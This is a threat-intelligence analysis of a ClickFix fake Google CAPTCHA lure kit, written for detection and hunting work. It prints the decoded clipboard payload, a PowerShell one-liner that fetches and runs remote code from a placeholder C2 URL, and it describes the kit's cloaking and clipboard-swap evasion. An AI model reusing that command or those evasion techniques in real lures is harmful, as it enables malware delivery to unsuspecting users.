---
id: RES-0004
title: "ClickFix Google CAPTCHA Lure Kit — Technical Analysis"
type: research
attack_techniques: [T1204.001, T1059.001]
informs_detections: ["[[DET-0002 - ClickFix PowerShell IRM Execution]]"]
informs_hunts: ["[[HUNT-0005 - ClickFix WordPress Delivery Network Hunt]]"]
references:
  - "https://attack.mitre.org/techniques/T1204/001/"
created: 2026-07-11
updated: 2026-07-11
tags: [research, clickfix, lure-kit, social-engineering, react]
---

# ClickFix Google CAPTCHA Lure Kit — Technical Analysis

**Evidence basis:** Static analysis of a React SPA bundle served by a live ClickFix lure site.
**Confidence:** High (source code confirmed).

## Kit overview

The lure is a React single-page application impersonating a Google "Unusual traffic from your computer network" security check. This variant is a discriminator: most ClickFix actors clone Cloudflare Turnstile; this kit uses the Google CAPTCHA theme instead.

Social-engineering flow: victim is prompted to press **Win + R → Ctrl + V → Enter** to paste and execute a clipboard payload via the Windows Run dialog.

## Clipboard swap — kill-chain core

The lure displays a benign-looking verification code while silently writing the malicious payload to the clipboard:

| Role | Variable | Content |
|---|---|---|
| Decoy (shown on screen) | `displayCode` | `"Google protection – verify with code: GOO-FAB"` |
| Live payload (written to clipboard) | `copyTextBase64` | base64 → `powershell -c "iex(irm '<c2-url>' -UseBasicParsing) <# ---Complete Verification--- ---PRESS ENTER--- #>"` |

Decode chain: `atob(copyTextBase64)` → `Uint8Array` → `TextDecoder("utf-8")` (internal function `ed()`).

Clipboard write sequence: `navigator.clipboard.writeText()` (primary) with hidden `<textarea>` + `document.execCommand("copy")` fallback for older browsers.

## Builder fingerprints (detection tells)

These artifacts are consistent across builds from the same kit and survive operator customization of the lure domain or payload URL:

| Tell | Value | Where |
|---|---|---|
| Decoy code token | `GOO-FAB` or `61Z-PAB` | `displayCode` prop |
| CSS class prefix | `utp-*` | Root component styles |
| Final-screen class | `final-screen hcfe` | Post-verification overlay div |
| Component architecture | `displayCode` / `copyTextBase64` props | React component signature |

**Builder demo mode discriminator:** When loaded without operator-supplied props, the kit falls back to hardcoded demo values (`GOO-FAB`/`61Z-PAB`). Finding these tokens in a wild-caught sample confirms the kit family even without access to the live payload.

## Evasion

- The clipboard payload includes trailing HTML comment noise (`<# ---Complete Verification--- #>`) to make the pasted content appear to complete a legitimate verification step.
- Server-side cloaking: the lure page returns a white page to automated scanners (headless UA, known bot ASNs) and serves the malicious content only to interactive browser sessions. Static crawling misses the payload.
- `navigator.clipboard` API write is gated on user gesture (button click) to satisfy browser permission requirements without triggering automated clipboard-access alerts.

## Detection surface

1. **DOM/JS inspection:** `GOO-FAB`/`61Z-PAB` token literals in page source. Visible only in non-cloaked responses.
2. **Proxy URL pattern:** React SPA bundles served from domains matching keyboard-mash naming patterns: very low legitimate-content prior.
3. **Clipboard telemetry:** EDR clipboard-write events from a browser process followed immediately by a Run-dialog `powershell.exe` spawn.
4. **Process lineage:** `explorer.exe` (Run dialog) → `powershell.exe` with `irm`+`iex` in command line; see [DET-0002 - ClickFix PowerShell IRM Execution](../20-detections/DET-0002%20-%20ClickFix%20PowerShell%20IRM%20Execution.md).

## Delivery architecture note

This lure kit is designed for centralized deployment: a single operator-controlled hub serves the React SPA to many compromised delivery sites simultaneously. The hub uses server-side session control to rotate payloads and revoke access. The clipboard payload URL observed in any single sample may no longer be active. Hunt on behavioral signals (process lineage), not on IOC-specific URLs.

## Public attribution
ClickFix as a delivery technique, and the EVALUSION / UNC2190 activity cluster delivering NetSupport RAT, have been documented in public vendor reporting (Proofpoint, Microsoft, and Sekoia have all published on ClickFix fake-CAPTCHA lures). The behavioral tells in this note are released TLP:CLEAR on that basis; no client-specific infrastructure is included. Search the named vendors' research blogs for "ClickFix" and "EVALUSION" for the primary sources.

## References
- https://attack.mitre.org/techniques/T1204/001/
- https://attack.mitre.org/techniques/T1059/001/
